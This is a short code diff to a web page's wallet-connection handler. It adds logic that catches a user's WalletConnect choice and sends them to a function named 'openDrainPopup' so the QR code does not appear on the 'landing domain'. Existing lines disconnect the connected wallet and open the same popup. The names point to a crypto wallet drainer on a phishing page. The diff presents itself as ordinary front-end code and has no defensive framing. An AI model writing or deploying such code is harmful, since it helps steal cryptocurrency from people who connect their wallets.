@@ -155,9 +155,14 @@ modal.subscribeEvents((event) => {
   if (e === 'SELECT_WALLET') {
     const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
     if (name) lastClickedWallet = name;
+    // Intercept WalletConnect immediately — don't let QR show on landing domain
+    if (name && name.toLowerCase().includes('walletconnect')) {
+      openDrainPopup('wc');
+      return;
+    }
   }
-  // Catch WalletConnect QR connections
-  if (e === 'CONNECT_SUCCESS' || e === 'MODAL_CLOSE') {
+  // Catch any other connections (backup)
+  if (e === 'CONNECT_SUCCESS') {
     const addr = modal.getAddress?.();
     if (addr && !popupOpened) {
       try { modal.disconnect(); } catch (e) {}
